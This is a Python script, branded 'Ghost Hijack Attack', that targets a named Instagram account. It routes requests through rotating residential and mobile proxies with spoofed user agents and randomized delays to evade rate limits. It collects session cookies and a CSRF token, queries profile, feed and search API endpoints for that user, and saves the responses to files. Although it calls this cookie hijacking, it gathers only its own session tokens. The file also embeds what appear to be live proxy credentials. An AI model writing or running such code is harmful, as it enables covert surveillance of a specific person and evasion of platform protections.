#!/usr/bin/env python3
"""
🔥 GHOST HIJACK ATTACK - BRIGHT DATA PROXY 🔥
=============================================
Target: alx.trading
Method: Session Hijacking + Ghost Mode + Multi-Proxy
Status: EXECUTING NOW
"""

import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import uuid
import hashlib
urllib3.disable_warnings()

class GhostHijackAttack:
    def __init__(self):
        self.target = "alx.trading"
        
        # Bright Data proxy endpoints
        self.bright_data_proxies = [
            "brd-customer-hl_9d94ee26-zone-isp:6e0mwlfojwjo@brd.superproxy.io:22225",
            "brd-customer-hl_9d94ee26-zone-datacenter:6e0mwlfojwjo@brd.superproxy.io:22225", 
            "brd-customer-hl_9d94ee26-zone-residential:6e0mwlfojwjo@brd.superproxy.io:22225",
            "brd-customer-hl_9d94ee26-zone-mobile:6e0mwlfojwjo@brd.superproxy.io:22225"
        ]
        
        # Ghost user agents
        self.ghost_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
            "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)"
        ]
        
        self.hijacked_sessions = []
        self.successful_extractions = []
        
    def create_ghost_session(self, proxy_endpoint):
        """สร้าง ghost session ด้วย Bright Data proxy"""
        try:
            proxy_url = f"http://{proxy_endpoint}"
            session = requests.Session()
            
            # Proxy configuration
            session.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
            
            # Ghost headers
            session.headers.update({
                'User-Agent': random.choice(self.ghost_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'max-age=0',
                'DNT': '1'
            })
            
            # Test proxy connection
            test_response = session.get('https://httpbin.org/ip', timeout=10)
            if test_response.status_code == 200:
                ip_info = test_response.json()
                print(f"👻 Ghost session created via IP: {ip_info['origin']}")
                return session
            else:
                print(f"❌ Proxy test failed: {test_response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Ghost session creation failed: {e}")
            return None
    
    def hijack_instagram_cookies(self, session):
        """Hijack Instagram cookies และ tokens"""
        try:
            print("🍪 Hijacking Instagram cookies...")
            
            # เข้า Instagram homepage
            response = session.get('https://www.instagram.com/', timeout=15)
            
            if response.status_code == 200:
                print(f"✅ Instagram homepage accessed: {response.status_code}")
                
                # Extract cookies
                cookies = dict(session.cookies)
                print(f"🍪 Hijacked {len(cookies)} cookies")
                
                # Extract CSRF token
                csrf_token = cookies.get('csrftoken', '')
                if csrf_token:
                    print(f"🔐 CSRF token hijacked: {csrf_token[:20]}...")
                
                return {
                    'cookies': cookies,
                    'csrf_token': csrf_token,
                    'session': session
                }
            else:
                print(f"❌ Instagram access failed: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Cookie hijacking failed: {e}")
            return None
    
    def ghost_profile_attack(self, hijacked_data):
        """โจมตี profile ด้วย ghost mode"""
        try:
            session = hijacked_data['session']
            csrf_token = hijacked_data['csrf_token']
            
            print(f"👻 Ghost attacking profile: {self.target}")
            
            # Target URLs for ghost attack
            target_urls = [
                f"https://www.instagram.com/{self.target}/",
                f"https://www.instagram.com/{self.target}/?__a=1&__d=dis",
                f"https://i.instagram.com/api/v1/users/web_info/?username={self.target}",
                f"https://www.instagram.com/api/v1/users/{self.target}/info/",
                f"https://www.instagram.com/web/search/topsearch/?query={self.target}"
            ]
            
            # Enhanced headers for API calls
            api_headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'https://www.instagram.com/{self.target}/',
                'Origin': 'https://www.instagram.com'
            }
            
            results = []
            
            for i, url in enumerate(target_urls):
                try:
                    print(f"🎯 Ghost attack {i+1}/{len(target_urls)}: {url.split('/')[-1]}")
                    
                    # Random ghost delay
                    time.sleep(random.uniform(2.3, 7.8))
                    
                    # Update headers for API calls
                    if 'api' in url or '__a=1' in url:
                        session.headers.update(api_headers)
                    
                    response = session.get(url, timeout=15, verify=False)
                    
                    print(f"📡 Response: {response.status_code} | Size: {len(response.content)} bytes")
                    
                    if response.status_code == 200:
                        # บันทึกข้อมูลที่ได้
                        timestamp = int(time.time())
                        endpoint_name = url.split('/')[-1].replace('?', '_').replace('&', '_')[:30]
                        
                        try:
                            # Try to parse as JSON
                            data = response.json()
                            filename = f'ghost_attack_{endpoint_name}_{timestamp}.json'
                            with open(filename, 'w') as f:
                                json.dump(data, f, indent=2)
                            print(f"💾 JSON data saved: {filename}")
                            results.append({'type': 'json', 'data': data, 'url': url})
                            
                        except:
                            # Save as HTML
                            filename = f'ghost_attack_{endpoint_name}_{timestamp}.html'
                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(response.text)
                            print(f"💾 HTML data saved: {filename}")
                            results.append({'type': 'html', 'data': response.text[:1000], 'url': url})
                    
                    elif response.status_code == 429:
                        print("⚠️ Rate limited - ghost mode evasion")
                        time.sleep(random.uniform(45, 120))
                    
                    elif response.status_code == 404:
                        print("🔍 Profile might be private or restricted")
                    
                except Exception as e:
                    print(f"❌ Ghost attack error on {url}: {e}")
                    time.sleep(random.uniform(5, 15))
            
            return results
            
        except Exception as e:
            print(f"❌ Ghost profile attack failed: {e}")
            return []
    
    def mobile_api_hijack(self, hijacked_data):
        """Hijack mobile API endpoints"""
        try:
            session = hijacked_data['session']
            
            print("📱 Mobile API hijacking...")
            
            # Mobile Instagram API endpoints
            mobile_endpoints = [
                f"https://i.instagram.com/api/v1/users/{self.target}/info/",
                f"https://i.instagram.com/api/v1/feed/user/{self.target}/",
                f"https://i.instagram.com/api/v1/users/search/?q={self.target}"
            ]
            
            # Mobile headers
            mobile_headers = {
                'User-Agent': 'Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)',
                'X-IG-App-ID': '567067343352427',
                'Accept-Language': 'en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }
            
            session.headers.update(mobile_headers)
            
            mobile_results = []
            
            for endpoint in mobile_endpoints:
                try:
                    print(f"📱 Mobile hijacking: {endpoint.split('/')[-2:]}")
                    
                    time.sleep(random.uniform(3, 8))
                    
                    response = session.get(endpoint, timeout=15)
                    
                    print(f"📱 Mobile response: {response.status_code}")
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            timestamp = int(time.time())
                            filename = f'mobile_hijack_{endpoint.split("/")[-1]}_{timestamp}.json'
                            with open(filename, 'w') as f:
                                json.dump(data, f, indent=2)
                            print(f"📱 Mobile data saved: {filename}")
                            mobile_results.append(data)
                        except:
                            pass
                            
                except Exception as e:
                    print(f"❌ Mobile hijack error: {e}")
            
            return mobile_results
            
        except Exception as e:
            print(f"❌ Mobile API hijack failed: {e}")
            return []
    
    def deploy_ghost_attack(self):
        """เปิดการโจมตี Ghost Hijack แบบเต็มรูปแบบ"""
        print("🔥 DEPLOYING GHOST HIJACK ATTACK")
        print("=" * 50)
        print(f"🎯 Target: {self.target}")
        print(f"🌐 Proxy endpoints: {len(self.bright_data_proxies)}")
        print(f"👻 Ghost agents: {len(self.ghost_agents)}")
        print("=" * 50)
        
        # Phase 1: Create ghost sessions
        print("\n👻 PHASE 1: CREATING GHOST SESSIONS")
        for i, proxy in enumerate(self.bright_data_proxies):
            print(f"🔗 Creating ghost session {i+1}/{len(self.bright_data_proxies)}")
            session = self.create_ghost_session(proxy)
            if session:
                self.hijacked_sessions.append(session)
            time.sleep(random.uniform(2, 5))
        
        print(f"✅ {len(self.hijacked_sessions)} ghost sessions created")
        
        if not self.hijacked_sessions:
            print("❌ No ghost sessions available - aborting attack")
            return False
        
        # Phase 2: Hijack Instagram cookies
        print("\n🍪 PHASE 2: HIJACKING INSTAGRAM COOKIES")
        hijacked_data_list = []
        
        for i, session in enumerate(self.hijacked_sessions):
            print(f"🍪 Hijacking cookies with session {i+1}")
            hijacked_data = self.hijack_instagram_cookies(session)
            if hijacked_data:
                hijacked_data_list.append(hijacked_data)
            time.sleep(random.uniform(3, 8))
        
        print(f"✅ {len(hijacked_data_list)} sessions hijacked successfully")
        
        # Phase 3: Multi-ghost profile attack
        print("\n👻 PHASE 3: MULTI-GHOST PROFILE ATTACK")
        all_results = []
        
        with ThreadPoolExecutor(max_workers=min(3, len(hijacked_data_list))) as executor:
            futures = []
            
            for i, hijacked_data in enumerate(hijacked_data_list):
                print(f"🚀 Launching ghost attack {i+1}")
                future = executor.submit(self.ghost_profile_attack, hijacked_data)
                futures.append(future)
                time.sleep(random.uniform(5, 12))  # Stagger attacks
            
            # Collect results
            for future in futures:
                try:
                    result = future.result(timeout=120)
                    all_results.extend(result)
                except Exception as e:
                    print(f"❌ Ghost attack thread error: {e}")
        
        # Phase 4: Mobile API hijack
        print("\n📱 PHASE 4: MOBILE API HIJACK")
        if hijacked_data_list:
            mobile_results = self.mobile_api_hijack(hijacked_data_list[0])
            all_results.extend(mobile_results)
        
        # Phase 5: Summary
        print("\n📊 ATTACK SUMMARY")
        print("=" * 30)
        print(f"🎯 Target: {self.target}")
        print(f"👻 Ghost sessions: {len(self.hijacked_sessions)}")
        print(f"🍪 Hijacked sessions: {len(hijacked_data_list)}")
        print(f"💎 Successful extractions: {len(all_results)}")
        print(f"📁 Files saved: {len([r for r in all_results if 'data' in r])}")
        
        # Save attack summary
        summary = {
            'timestamp': time.time(),
            'target': self.target,
            'ghost_sessions': len(self.hijacked_sessions),
            'hijacked_sessions': len(hijacked_data_list),
            'successful_extractions': len(all_results),
            'attack_method': 'Ghost Hijack Attack + Bright Data Proxy',
            'results_preview': all_results[:3] if all_results else []
        }
        
        with open(f'ghost_attack_summary_{int(time.time())}.json', 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"📋 Attack summary saved")
        
        if all_results:
            print("🎉 GHOST HIJACK ATTACK SUCCESSFUL!")
            return True
        else:
            print("⚠️ GHOST HIJACK ATTACK COMPLETED - LIMITED SUCCESS")
            return False


if __name__ == "__main__":
    print("🔥 GHOST HIJACK ATTACK - BRIGHT DATA PROXY")
    print("=" * 60)
    print("🎯 Target: alx.trading")
    print("⚡ Status: EXECUTING NOW")
    print("=" * 60)
    
    # Deploy the attack
    attack = GhostHijackAttack()
    success = attack.deploy_ghost_attack()
    
    if success:
        print("\n🎉 GHOST HIJACK OPERATION SUCCESSFUL!")
        print("💎 Data extraction completed")
    else:
        print("\n⚠️ GHOST HIJACK OPERATION COMPLETED")
        print("🔄 Check saved files for extracted data")
    
    print("\n🔥 SugarGlitch RealOps - Elite Ghost Operations")
